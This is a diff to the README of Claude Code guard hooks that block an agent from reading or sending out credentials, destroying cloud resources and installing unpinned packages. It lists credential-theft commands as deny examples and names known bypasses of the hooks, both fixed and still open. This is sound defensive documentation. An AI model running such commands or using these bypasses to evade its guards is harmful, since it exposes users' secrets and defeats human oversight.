@@ -45,11 +45,11 @@ Terraform as it is edited.
 
 **aws-guard** — Denies AWS CLI and AWS Tools for PowerShell calls that turn off logging or detection (CloudTrail, GuardDuty, Config, Security Hub, log groups, flow logs), open S3 to the public, change IAM access or identities (including SSH public keys, signing certificates, IAM Identity Center permission sets, assignments and directory users and groups, and IAM Roles Anywhere trust anchors and profiles), write static access keys to disk (`aws configure set aws_secret_access_key`, `aws configure import`, `Set-AWSCredential -StoreAs` with keys), change Organizations, weaken or destroy KMS keys, or destroy data (buckets, databases, tables, instances, backups, hosted zones), and hands the command to the user to run.
 
-**supply-chain-guard** — Denies installs of a package no lockfile or hash pins: `pip install` without `--require-hashes` (also `python -m pip` and `uv pip`), and `npm`/`pnpm`/`yarn`/`bun` install or add of a named package, and `uv add`. `npm ci`, a bare `npm install`, `pip install -e` and `uv sync` run.
+**supply-chain-guard** — Denies installs of a package no lockfile or hash pins: `pip install` without `--require-hashes` (also `python -m pip` and `uv pip`), and `npm`/`pnpm`/`yarn`/`bun` install or add of a named package, and `uv add`, also through a runner (`npx`, `pnpm exec`, `yarn run`, `uv run`, `python -m`, corepack) or with the verb or tool filled in by the shell, plus `composer require` without an exact version and `go run pkg@latest`. `npm ci`, a bare `npm install`, `pip install -e` and `uv sync` run.
 
 **secret-read-guard** — Denies reading a credential file into the conversation, by `Read`, `Grep` or a shell command that prints or copies it out (`cp`, `robocopy`, `mklink`, `New-Item -ItemType SymbolicLink`, `Compress-Archive`, `tar -c`): `.env` files, AWS (`aws login`/SSO/CLI caches too), SSH, cloud CLI and Az PowerShell, npm, Docker, any file under `~/.kube`, GitHub CLI, git, Codex and Claude credentials (`~/.claude.json` too), service-account JSON keys, private keys (`*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.ppk`), Terraform state and `*.tfvars`. Denies sending one out (`gh gist create .env`, `curl -F f=@.env`, `aws s3 cp .env s3://…`, `Invoke-WebRequest -InFile`, `git add .env`) and a recursive search from above the home folder (`rg x C:\Users`, `grep -r x /`). Also denies dumping the whole environment (`env`, `printenv`, `Get-ChildItem Env:`, through `aws-vault exec`, `op run` or `doppler run` too), printing one variable named for a credential (`echo $GITHUB_TOKEN`, `$env:AWS_SECRET_ACCESS_KEY`), and commands that print a stored credential (`aws configure get aws_secret_access_key`, `aws secretsmanager get-secret-value`, `aws ssm get-parameter --with-decryption`, `aws ecr get-login-password`, `Get-SECSecretValue`, `gh auth token`, `git credential fill`, `terraform state pull`, `terraform output -json`, `op read`, `vault kv get`, `sops -d`, `kubectl get secret -o yaml`). `.env.example`, `*.pub`, a project's `.mcp.json`, existence checks, programs that use a file or variable without printing it (`terraform -var-file`, `ssh -i`, `curl -H "Authorization: Bearer $GITHUB_TOKEN"`, `echo $GITHUB_TOKEN | gh auth login --with-token`) and `aws ecr get-login-password | docker login --password-stdin` still run.
 
-**tf-lint** — Denies edits, file-writing shell commands (`>`, `tee`, heredoc, `Set-Content`) and MCP tool calls (mail, artifacts) that carry an AWS access key, a private key or an API token (GitHub, GitLab, npm, Slack, Anthropic, OpenAI, Stripe live, Google, Azure storage, Supabase). Flags Terraform that hardcodes the `arn:aws:` partition, opens SSH/RDP to `0.0.0.0/0`, creates a KMS key without rotation or a 7-30 day deletion window, sets a GovCloud provider without FIPS endpoints, creates a static `aws_iam_access_key` or an `aws_iam_user_login_profile`, creates a long-lived Google service account key or Azure application or service principal secret, trusts GitHub OIDC without a pinned repo `sub` and an `aud` condition, grants a `*` principal without a condition, grants every action (`Action "*"`) or all of `iam:*` or `sts:*`, or leaves a secret-named variable or output unmarked `sensitive` (or gives such a variable a literal default). Flags GitHub Actions workflows that pass static AWS keys instead of `role-to-assume`, or a stored Azure or Google credential instead of workload identity federation.
+**tf-lint** — Denies edits, file-writing shell commands (`>`, `tee`, heredoc, `Set-Content`, `New-Item`, `sed -i`, `dd of=`, `git config`, `WriteAllText`, `open().write`) and MCP tool calls (mail, artifacts) that carry an AWS access key, a private key or an API token (GitHub, GitLab, npm, Slack, Anthropic, OpenAI, Stripe live, Google, Azure storage, Supabase). Flags Terraform that hardcodes the `arn:aws:` partition, opens SSH/RDP to `0.0.0.0/0`, creates a KMS key without rotation or a 7-30 day deletion window, sets a GovCloud provider without FIPS endpoints, creates a static `aws_iam_access_key` or an `aws_iam_user_login_profile`, creates a long-lived Google service account key or Azure application or service principal secret, trusts GitHub OIDC without a pinned repo `sub` and an `aud` condition, grants a `*` principal without a condition, grants every action (`Action "*"`) or all of `iam:*` or `sts:*`, or leaves a secret-named variable or output unmarked `sensitive` (or gives such a variable a literal default). Flags GitHub Actions workflows that pass static AWS keys instead of `role-to-assume`, or a stored Azure or Google credential instead of workload identity federation.
 
 **secret-allow-guard** — At session start, warns when a permission rule, an `env` value or an MCP server's `env` or `headers` value holds a literal secret, in the project's or your own `.claude/settings*.json`, `~/.claude.json` (yours and every project's MCP servers) or the project's `.mcp.json` ("Yes, and don't ask again" saves the whole command: `PGPASSWORD=`, `sshpass -p`, `mysql -p`, a bearer token, a `user:pass@` URL, an AWS, GitHub, OpenAI, npm, Slack or Supabase key, a private key), and when the project's `settings.local.json` is tracked by git or not git-ignored. It names the file and the count, never the value.
 
@@ -276,7 +276,7 @@ Some mods read a setting from the same `env` block. Each is optional.
 ## Development
 
 ```sh
-npm ci      # installs the pinned Claude Code release
+npm ci      # installs the pinned Claude Code release (2.1.325)
 npm test    # runs every mod's tests, and checks the shared parser copies match
 ```
 
@@ -290,6 +290,27 @@ terraform-guard, aws-guard, supply-chain-guard and secret-read-guard each carry 
 (through `bash -c`, `env`, `xargs`, subshells, substitutions and PowerShell
 script blocks). Mods load folder by folder, so each keeps its own copy; CI
 fails if the copies drift apart.
+
+### Latest test results
+
+0.9.0 release candidate, Windows 11, Claude Code 2.1.325 (the pinned dev
+release), `npm test`: all 6 mods pass, 4,523 tests, 0 failures; the four
+`shell.ts` copies match.
+
+| Mod | Tests |
+|---|---|
+| aws-guard | 1,050 |
+| secret-allow-guard | 143 |
+| secret-read-guard | 1,609 |
+| supply-chain-guard | 490 |
+| terraform-guard | 579 |
+| tf-lint | 652 |
+
+The tests run each guard through Claude Code's engine with mocked tool
+calls and a mocked file listing. secret-read-guard's folder listing was also
+checked once in a live session. CI runs the same suite on Ubuntu. The
+release checklist ([RELEASE_CHECKLIST.md](RELEASE_CHECKLIST.md)) holds the
+full evidence.
 
 ### Versions and releases
 
@@ -349,9 +370,25 @@ when it would be worth lifting.
   `aws --profile ($p) iam delete-role` or `aws s3 rm ($p) --recursive`
   runs; the cmdlets denied only by their arguments (`-StoreAs`,
   `-Terminate`) are also read from the text, so a later mention of the
-  cmdlet's name in the same command can be denied too.
-- **supply-chain-guard** reads the install verbs of pip, uv, npm, pnpm, yarn
-  and bun; poetry, conda and a script that installs are not checked.
+  cmdlet's name in the same command can be denied too. A substitution,
+  variable or glob before the operation is denied unless it is a known
+  global option's value in double quotes on a one-line command
+  (`--profile "$P"`, `--region "$(aws configure get region)"`); unquoted,
+  in a multi-line command, after an earlier quoted substitution, joined with
+  `=` or on an abbreviated option it is denied. With `--entrypoint aws`, any
+  substitution or variable after it denies. `-WhatIf` is not honoured in a
+  command that contains a here-string.
+- **terraform-guard** denies a destroy fed by a pipe, unless a plain command
+  and a `;` or newline end the pipe first and the command defines no function
+  and holds no `{ }` or `( )`. It denies an unquoted substitution
+  before the subcommand (`terraform -chdir=$(pwd) validate`; quote it), and a
+  `$`, backtick or `{` anywhere in a command that sets `TF_CLI_ARGS` before an
+  apply or destroy.
+- **supply-chain-guard** reads the install and run verbs of pip, uv, pipx,
+  npm, pnpm, yarn, bun, cargo, gem, go and composer, and follows a tool run
+  through npx, `pnpm exec`, `yarn run`, `uv run`, `python -m` or corepack;
+  poetry, conda and a script that installs are not checked. `composer require`
+  needs an exact version (`vendor/pkg:1.2.3`); a range is denied.
 - **tf-lint** reads only the text being written, block by block. A rule split
   across edits or built from variables is missed; run Checkov on the whole
   file for that. An edit that changes only a trust policy's `sub` values,
@@ -388,14 +425,32 @@ when it would be worth lifting.
   with no token is denied until `SECRET_READ_ALLOW` names it. Since Edit
   needs a Read first, a guarded file can be rewritten whole but not
   edited in place. For secrets that must stay out of reach, keep them out
-  of the account Claude runs as.
+  of the account Claude runs as. A wildcard that writes no credential name
+  (`cat *`, `cat prod*`) is tried against the files in its folder, by the
+  shell guard only, dot files included: a wildcard in a folder's name
+  (`cat */prod*`) is not followed, a folder that cannot be listed is judged by
+  the wildcard's text alone, a folder of more than 2,000 entries is denied,
+  and after a `cd` the wildcard is also tried in the starting folder, so
+  `cd docs && cat *` is denied when the project root holds a credential file.
+  So are `grep TODO *`, `git add *` and `tar czf x.tgz *` in a folder that
+  holds one. `$env:GITHUB_TOKEN.Length` runs; any other member or index on a
+  credential variable is denied.
 - **tf-lint**'s secret deny matches key formats with a fixed shape. It
   leaves out JWTs, bearer values, `password=` and `user:pass@host`, which
   in source files are mostly fixtures and local defaults; run gitleaks or
   trufflehog in CI for those. In a shell command it checks only one that
   writes a file (`>`, `>>`, `tee`, a heredoc, `Set-Content`, `Add-Content`,
-  `Out-File`); a key built from pieces, or written by a script the command
-  runs, passes. Every other MCP tool call is checked whole, so one that
+  `Out-File`, `New-Item`, the aliases `sc`, `ac` and `ni`, `dd of=`, `sed -i`,
+  `perl -i`, a write or append method call such as `WriteAllText` or
+  `open().write`, `git config`, `aws configure set`, `npm config set`); a key
+  built from pieces, or written by a script the command runs, passes.
+  `sed`/`perl` with any `-i` flag, and `git` with `config`, are matched as two
+  words anywhere in the command, so a command that only reads
+  (`grep -i <key> f | sed 1q`) is denied when it carries a key. An
+  all-upper-case 20-character word starting `AKIA` or `ASIA`, and an
+  `xoxa-`/`xoxr-` placeholder, are still denied; a key id written in lower
+  case passes. In a workflow only double quotes are read as strings, so a `#`
+  after a space inside single quotes still cuts the line. Every other MCP tool call is checked whole, so one that
   looks up a real key by its value is denied too.
 - **secret-allow-guard** checks at session start, so a rule approved during
   a session is caught by the next one. It matches known key formats and
@@ -408,61 +463,45 @@ when it would be worth lifting.
   header name (`X-Auth`) is missed. Ignore the
   file in every repo on the machine, including ones cloned later, with
   `git config --global core.excludesfile ~/.gitignore_global` and
-  `.claude/settings.local.json` as a line in that file.
+  `.claude/settings.local.json` as a line in that file. It passes a `*_FILE`
+  value or a whole `PWD` entry that starts like a path, `token_type=bearer`,
+  and a `Bearer <placeholder>`; a secret of exactly one of those shapes is not
+  flagged unless it has a known key format.
 
-### Found by the 0.8 hardening audit, not yet fixed
+### Still open after the 0.9 pass
 
-The mods read command text and config as written, so a determined caller can
-still get past them, and some ordinary commands are denied. These were
-reproduced; the next release will work through them.
+0.9.0 worked through the bypasses and false positives the 0.8 hardening audit
+reproduced (see [CHANGELOG.md](CHANGELOG.md)). These remain, known and
+reproduced; most need the parser to expand variables, which it does not.
 
-- **Every command guard, shared parser.** A command over 64 KB, or one nested
-  past 8 levels, is denied as unreadable. A brace or `$'…'` quoting form the
-  parser does not model can hide a word. A substitution is marked, not
-  expanded, so `terraform destroy -auto-approve -backup --h` and
-  `TF_CLI_ARGS=-auto-appr\ove terraform destroy` pass in the parts that match
-  raw text.
-- **aws-guard.** A PowerShell here-string can hide `-WhatIf` or `-OutVariable`.
-  `aws s3 $(echo rb) s3://bucket --force`, `aws iam del$()ete-role` and
-  `aws $(echo s3) rb …` pass, because a bare word after a substitution clears
-  the unread flag. `docker run --entrypoint aws img iam delete-role`, `aws $OPTS …`
-  and `cmd /c a^ws …` pass. Organizations and sso-admin calls after a
-  substitution are not checked by the first-word test.
-- **supply-chain-guard.** Abbreviated verbs (`npm upd`, `npm exe`, `npm creat`),
-  two unlisted value options before the verb (`pip --retr 3 --timeo 5 install`),
-  a uv option before `pip`, and a URL in a pinned spec (`uvx --from
-  git+https://…@1.2.3`) pass. A verb or tool name from the shell (`npm $(echo
-  install)`, a variable) and a runner whose program is not followed
-  (`npx --no-install npm install`, `pnpm exec pip install`, `yarn run pip install`)
-  pass. `pip install -r https://…`, `composer require evil/x:*`, `go run
-  evil.example/x@latest` and `npm install --package-lock=0` pass. `npx tsc` is
-  denied unless pinned or run with `--no-install`, and an install with a
-  substitution anywhere, such as `npm install --prefix "$(pwd)/web"`, is denied.
-- **secret-read-guard.** `echo ${GITHUB_TOKEN}`, `echo "$(<.env)"`,
-  `kubectl get Secret -o yaml` and `$env:GITHUB_TOKEN.ToString()` pass. A chain
-  of more than three `cd` moves is not followed, and a bare `cd` is not
-  treated as home. `cat *` and a dot-less `cat prod*` are not followed. A
-  `cd $VAR` or `cd "$(…)"` denies a later credential-name read, and
-  `cat .env.ex*` and `cat config.*` are denied. `echo 'export { a, b }'` is
-  denied as an environment dump.
-- **terraform-guard.** The pipe rule denies `terraform plan | tee plan.txt;
-  terraform destroy` and `git log | head; terraform destroy`, so a destroy after
-  an unrelated pipe is denied. `terraform $(echo destroy -auto-approve -backup)
-  plan`, `$'\x2dauto-approve'`, `find … -exec terraform destroy -auto-approve \;`
-  and `>|out` forms pass.
-- **secret-allow-guard.** A flag such as `--token enabled-mode` or
-  `-p 8080:80` in MCP args, and a `?token_type=bearer` url parameter, are
-  flagged. `TOKEN_FILE`, `PASSWORD_FILE`, `TOKEN_ENDPOINT` and `PWD` are
-  flagged by name. `Bearer <your-token>` placeholders are flagged. A file that
-  does not parse as JSON, such as one with a comment line, misses an
-  `"args":["--api-key","…"]` secret.
-- **tf-lint.** Assignments of a key through `os.environ[...]`, `props.put(...)`,
-  a heredoc or block-scalar value, and writes through `sed -i`,
-  `WriteAllText`, `New-Item -Value`, `| sc`, `| dd of=`, `python -c open().write`
-  and `git config user.token` pass. The key pattern also denies some ordinary
-  words that start with `asia` or `akia` and a few `xox` prefixed strings, as
-  false positives. `dynamic "egress"` and `egress = true` warn as open ports.
-  `description = "DB #1"` cuts the value at `#`.
+- **Every command guard, shared parser.** A command over 64 KB, nested past 8
+  levels, or with a `case` inside `$( )` is denied as unreadable. A
+  substitution is marked, not expanded. Variables and aliases are not
+  followed, and `${…}` is read to its first `}`.
+- **terraform-guard.** A function or script that runs destroy and is fed by a
+  pipe (`f() { terraform destroy; }; yes | f`) is not followed. A substitution
+  before the program under a wrapper (`sudo $(…) terraform plan`) is only
+  marked. Any `<` together with a destroy is denied.
+- **supply-chain-guard.** A tool named by a variable after a wrapper
+  (`sudo $NPM install x`) and a runner named by the shell (`$(echo npx) pkg`)
+  pass, as do `python $(echo -m pip install x)`, `npx -c "pip install x"`,
+  `go get pkg@latest` and `npm_config_package_lock=false npm install`.
+  Denied though harmless: `npx tsc` unless pinned or run with `--no-install`,
+  an install with a substitution anywhere (`npm install --prefix "$(pwd)/web"`),
+  a substitution before the verb, and a shell-named program followed by
+  `install` (`$(which make) install`).
+- **secret-read-guard.** The wildcard listing lower-cases the folder path, so
+  on a case-sensitive disk (Linux) a wildcard in a subfolder with capitals in
+  its name is judged by its text alone, as in 0.8. `$env:GITHUB_TOKEN | Write-Output` and
+  `$env:GITHUB_TOKEN -replace 'a','b'` pass. Denied though harmless: a
+  credential-name read after `cd $VAR` or `cd "$(…)"`, and `cat .env.ex*` and
+  `cat config.*`, which could match a real credential file.
+- **secret-allow-guard.** A flag such as `--token enabled-mode` in MCP args is
+  flagged: a word cannot be told from a passphrase. `TOKEN_ENDPOINT` with a
+  plain url is flagged, since a signed url (`?sig=…`) holds a credential.
+- **tf-lint.** `python -c "print(KEY, file=open(...))"`, `Set-Item`, a `cp` or
+  `mv` of a generated file, and a key transformed in the command (upper-cased,
+  base64) pass.
 
 ## Security
 
